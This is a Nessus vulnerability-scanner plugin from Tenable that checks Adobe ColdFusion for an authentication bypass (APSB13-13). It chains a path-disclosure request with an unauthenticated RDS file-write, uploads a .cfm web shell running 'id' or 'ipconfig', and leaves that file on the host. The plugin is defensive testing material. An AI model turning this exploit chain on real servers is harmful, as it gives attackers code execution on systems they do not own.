#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66408);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/10/29 18:09:14 $");

  script_cve_id("CVE-2013-1389");
  script_bugtraq_id(59849);
  script_osvdb_id(93321);
  script_xref(name:"TRA", value:"TRA-2013-04");
  script_xref(name:"CERT", value:"113732");
  script_xref(name:"EDB-ID", value:"25305");  # only referenced since the path disclosure vuln is used by this plugin

  script_name(english:"Adobe ColdFusion Authentication Bypass (APSB13-13) (intrusive check)");
  script_summary(english:"Uploads a cfm file that executes code.");

  script_set_attribute(attribute:"synopsis", value:
"A web management interface on the remote host has an authentication
bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host has an
authentication bypass vulnerability. When RDS is disabled and not
configured with password protection, it is possible to authenticate as
an administrative user without providing a username or password. A
remote, unauthenticated attacker can exploit this to gain
administrative access to the ColdFusion Administrator interface. After
authenticating, it is possible to write arbitrary files to the host,
resulting in arbitrary code execution. 

All versions of ColdFusion 10 are affected. ColdFusion 9, 9.0.1, and
9.0.2 are only affected when the hotfixes for APSB13-03 have been
applied and web.xml is configured to allow access to the RDS servlet. 

This plugin exploits the vulnerability by creating a .cfm file to
execute arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2013-04");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb13-13.html");
  # http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-13.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b9b1d947");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate hotfix referenced in Adobe security bulletin
APSB13-13.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/05/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl", "coldfusion_rds_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");
include("url_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# The vulnerability is present if RDS is disabled _and_ configured to not require
# authentication. In the name of avoiding false positives and negatives,
# this plugin will only bail out if RDS is enabled and authentication
# is not required, an issue which is already reported by a different
# plugin (coldfusion_rds_unauthenticated.nasl)
rds_enabled = get_kb_item('coldfusion/' + port + '/rds/enabled');
if (rds_enabled)
  exit(0, "RDS is enabled on the " +app+ " install at " + install_url);

# exploit the path disclosure vulnerability (EDB-ID 25305)
# to figure out where the .cfm file should be written
cfm = '/CFIDE/adminapi/customtags/l10n.cfm';
qs =
   'attributes.id=it' +
  '&attributes.file=../../administrator/analyzer/index.cfm' +
  '&attributes.locale=it' +
  '&attributes.var=it' +
  '&attributes.jscript=false' +
  '&attributes.type=text/html' +
  '&attributes.charset=UTF-8' +
  '&thisTag.executionmode=end' +
  '&thisTag.generatedContent=htp';
url = cfm + '?' + qs;
res = http_send_recv3(method:'GET', port:port, item:url, exit_on_fail:TRUE);

cookie = get_http_cookie_from_key('ANALYZER_DIRECTORY=/');
www_path = cookie['value'];
if (isnull(www_path))
  exit(1, 'Unable to determine document root for port ' + port + '.');
else
  www_path = urldecode(estr:www_path);

# this could look like either of the following:
# C:\Inetpub\wwwroot\
# C:\Inetpub\wwwroot\CFIDE\adminapi\customtags
# /var/www/html/
# the plugin only needs the document root, so if it looks like anything
# additional is given, it will be stripped away
extra = strstr(www_path, 'CFIDE');
www_path -= extra;

# use the path disclosure vulnerability to determine which command to run
# (assume a path with forward slashes is *nix and backslashes is Windows)
if ('/' >< www_path)
{
  os_cmd = 'id';
  pattern = "uid=[0-9]+.*gid=[0-9]+.*";
}
else
{
  os_cmd = 'ipconfig';
  pattern = 'Windows IP Configuration|Subnet Mask|IP(v(4|6)?)? Address';
}

# add a trailing path separator if one is not already present
if (www_path[strlen(www_path) - 1] !~ "[\\/]")
  www_path += '/';

# for CF9 an absolute path to the document root must be given.
# for CF10 the web files are contained in the CF installation directory.
# this means the files shouldn't be written to the path found by the
# path disclosure vulnerability, but it also means a relative path can be given.
# try both approaches to avoid false negatives
paths = make_list(www_path, '../wwwroot/');

foreach path (paths)
{
  timestamp = unixtime();
  cfm_file = 'CFIDE/' + SCRIPT_NAME - ".nasl" + '.cfm';
  contents =
  '<cfexecute name="' + os_cmd + '"
  variable="output"
  timeout="20" />
  <cfoutput>#output#' + timestamp + '</cfoutput>';
  filename = path + cfm_file;
  rds_cmd = 'WRITE';
  rds_req =
    '4:STR:' + strlen(filename) + ':' + filename +
    'STR:' + strlen(rds_cmd) + ':' + rds_cmd +
    'STR:0:' +
    'STR:' + strlen(contents) + ':' + contents;

  # don't care what the return value is since the next request
  # will determine whether or not the exploit worked
  http_send_recv3(
    method:'POST',
    port:port,
    item:'/CFIDE/main/ide.cfm?ACTION=fileio',
    data:rds_req,
    exit_on_fail:TRUE
  );
  exploit_request = http_last_sent_request();

  # sometimes it seems to take a little longer to execute the command via the .cfm request
  http_set_read_timeout(get_read_timeout() * 2);
  verification_url = (dir - "CFIDE") + cfm_file;

  res = http_send_recv3(method:'GET', item:verification_url, port:port, exit_on_fail:TRUE);
  output = res[2];
  verify_url = install_url - "/CFIDE" + verification_url;
  # since the filename the plugin attempts to write is always the same,
  # a unix timestamp will be included in the command output to make sure
  # the file was created when the plugin thinks it was created
  if (timestamp >< output && egrep(string:res[2], pattern:pattern))
  {
    if (os_cmd == "ipconfig") line_limit = 10;
    else line_limit = 5;
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      cmd         : os_cmd,
      line_limit  : line_limit,
      request     : make_list(exploit_request, verify_url),
      output      : chomp(output),
      rep_extra   : 'Note that this file has not been removed and will need to be\nmanually deleted.'
    );
    exit(0);
    # never reached
  }
}

audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
